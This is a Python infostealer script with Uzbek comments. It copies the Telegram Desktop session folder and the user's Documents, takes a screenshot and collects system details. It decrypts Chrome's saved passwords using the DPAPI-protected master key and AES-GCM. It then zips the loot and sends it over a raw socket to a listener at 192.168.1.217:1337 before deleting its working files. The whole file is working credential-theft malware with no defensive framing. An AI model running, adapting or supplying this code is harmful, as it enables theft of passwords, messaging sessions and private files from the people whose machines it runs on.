import socket
import platform
from PIL import ImageGrab
import os
import shutil
import psutil
import sqlite3
import json
import base64
import win32crypt  
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

IP = "192.168.1.217"  
PORT = 1337
DOCUMENT_PATH = r"C:\Users\User\Documents"
TG_PATH = r"C:\Users\User\AppData\Roaming\Telegram Desktop\tdata"


def copy_folder(src_name, dest_name):
    dest_folder = os.path.join("test", dest_name)

    for dirpath, _, filenames in os.walk(src_name):
        dest_path = os.path.join(dest_folder, os.path.relpath(dirpath, src_name))

        os.makedirs(dest_path, exist_ok=True)
        for filename in filenames:
            src_file = os.path.join(dirpath, filename)
            dest_file = os.path.join(dest_path, filename)
            try:
                shutil.copy2(src_file, dest_file)  # Faylni nusxalash
                print(f"Copied {src_file} to {dest_file}")
            except (PermissionError, OSError) as e:
                print(f"Failed to copy {src_file}: {e}")

copy_folder(TG_PATH, "telegram data")
copy_folder(DOCUMENT_PATH, "documents")


# Skrinshot
screenshot = ImageGrab.grab()
screenshot.save("screenshot.png")
screenshot.close()



# data about system
data = {
    "cpu": platform.processor(),
    "ram": psutil.virtual_memory().total,
    "storage": 512,
    "windows version": platform.platform(),
    "username": os.getlogin(), 
    "hostname": socket.gethostname(),
    "ip_addresses": socket.gethostbyname_ex(socket.gethostname())[2]
}

# write data to test.txt
with open("test.txt", "w") as f:
    print("Writing files...")
    for x in data:
        f.write(f"{x}: {data[x]} \n") 

def get_chrome_passwords():
    login_data_path = os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data')
    local_state_path = os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data\Local State')

    temp_login_data_path = 'Login Data'
    shutil.copyfile(login_data_path, temp_login_data_path)

    with open(local_state_path, 'r') as file:
        local_state = json.load(file)
    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:] 
    decrypted_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

    conn = sqlite3.connect(temp_login_data_path)
    cursor = conn.cursor()
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

    # Faylga yozish
    with open("test/chrome_passwords.txt", "w") as file:
        for row in cursor.fetchall():
            origin_url = row[0]
            username = row[1]
            encrypted_password = row[2]
            decrypted_password = decrypt_password(encrypted_password, decrypted_key)
            
            # Faylga yozish
            file.write(f"URL: {origin_url}\nUsername: {username}\nPassword: {decrypted_password}\n\n")

    cursor.close()
    conn.close()
    os.remove(temp_login_data_path)

def decrypt_password(encrypted_password, key):
    """ AES-GCM yordamida parolni dekriptiya qilish """
    nonce = encrypted_password[3:15]
    ciphertext = encrypted_password[15:-16]
    tag = encrypted_password[-16:]
    
    cipher = Cipher(
        algorithms.AES(key),
        modes.GCM(nonce, tag),
        backend=default_backend()
    )
    decryptor = cipher.decryptor()
    decrypted_password = decryptor.update(ciphertext) + decryptor.finalize()
    return decrypted_password.decode("utf-8")

# chrome parollarni decrypt qilish va faylga yozish
get_chrome_passwords()


# zip files
def zip_elements(elements):
    new_folder = "zip_test"

    for file in elements:
        shutil.copy(file, os.path.join("test", file))
    shutil.make_archive(new_folder, 'zip', "test")

    return new_folder

elements = ["test.txt", "screenshot.png"]
new_folder = zip_elements(elements)



# send files
def send(filename, socket):
    with open(filename, "rb") as f:
        while (chunk := f.read(1024)):
            socket.send(chunk)



# connect
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect((IP, PORT))
print(f"Connected to {IP}:{PORT}")

send("zip_test.zip", client_socket)
print("File transfer complete.")
client_socket.close()

shutil.rmtree("test")
os.remove("zip_test.zip")